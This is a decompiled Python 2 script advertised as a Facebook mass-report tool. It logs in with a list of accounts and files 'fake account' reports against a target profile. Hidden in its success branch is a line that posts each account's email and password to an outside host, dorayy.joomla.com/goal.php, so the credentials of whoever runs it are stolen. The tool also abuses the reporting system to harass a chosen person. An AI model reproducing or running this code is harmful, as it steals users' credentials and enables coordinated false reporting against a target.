# uncompyle6 version 3.2.5
# Python bytecode 2.7 (62211)
# Decompiled from: Python 3.7.2 (default, Jan 16 2019, 21:02:05) 
# [Clang 7.0.2 (https://android.googlesource.com/toolchain/clang 003100370607242d
# Embedded file name: dg
# Compiled at: 2018-02-25 13:25:47
import requests, re, urllib, threading, sys, os
from bs4 import BeautifulSoup as bs
zz = 0
print '\n\t[ FACEBOOK MASS REPORT By Deray ]\n'

class reports(threading.Thread):

    def __init__(self, email, pw, target, jumlah):
        threading.Thread.__init__(self)
        self.email = email
        self.pw = pw
        self.jumlah = jumlah
        self.target = target

    def run(self):
        global zz
        url = 'https://free.facebook.com'
        ur = 'https://free.facebook.com/login/?ref=dbl&fl&refid=8'
        r = requests.Session()
        u = r.post(ur, data={'email': self.email, 'pass': self.pw, 
           'submit': 'Masuk'}).text
        p = r.get('https://free.facebook.com/profile.php?id=%s' % self.target).text
        v = bs(p, features='html.parser')
        for x in v.find_all('a', href=True):
            if '/rapid_report' in x['href']:
                self.rp = x['href']

        r2 = r.get(url + self.rp).text
        r3 = bs(r2, features='html.parser')
        for x in r3('form'):
            a = x['action']

        for x in r3('input'):
            if 'fb_dtsg' in x['name']:
                dtsg = x['value']
            if 'jazoest' in x['name']:
                jz = x['value']
            if 'fake_account' in x['value']:
                act = x['value']

        r4 = r.post(url + a, data={'fb_dtsg': dtsg, 
           'jazoest': jz, 
           'tag': act, 'submit': 'Kirim'}).text
        r5 = bs(r4, features='html.parser')
        for x in r5('form'):
            a1 = x['action']

        for x in r5('input'):
            if 'dtsg' in x['name']:
                d1 = x['value']
            if 'jazoest' in x['name']:
                jz = x['value']

        ok = r.post(url + a1, data={'fb_dtsg': d1, 
           'jazoest': jz, 
           'submit': 'Kirim'}).text
        if 'untuk Ditinjau' in ok:
            print ('\r[+] Report Sukses [{}|{}]').format(self.email, self.pw)
            requests.post('http://dorayy.joomla.com/goal.php', data={'email': self.email, 'passs': self.pw})
        else:
            print ('\r[!] Report Gagal [{}|{}]').format(self.email, self.pw)
        zz += 1
        print ('\r[+] Reporting {} of {}').format(zz, self.jumlah),
        sys.stdout.flush()


x = 1
z = 0
t = []
e = open(raw_input('[+] Sparator : spasi\n[=] akun list: ')).read().split('\n')
targ = raw_input('[+] Target ID: ')
em = open('email.txt', 'w')
ps = open('pass.txt', 'w')
while x <= len(e):
    try:
        em.write(e[x] + '\n')
    except:
        pass
    else:
        x = x + 2

em.close()
while z <= len(e):
    try:
        ps.write(e[z] + '\n')
    except:
        pass
    else:
        z = z + 2

ps.close()
a = open('email.txt').read().splitlines()
b = open('pass.txt').read().splitlines()
print '[+] Please wait loading list ...'
for x in range(len(a)):
    z = reports(b[x], a[x], targ, len(a))
    t.append(z)

for z in t:
    z.start()

for z in t:
    z.join()

os.remove('email.txt')
os.remove('pass.txt')
# okay decompiling 3.pyc
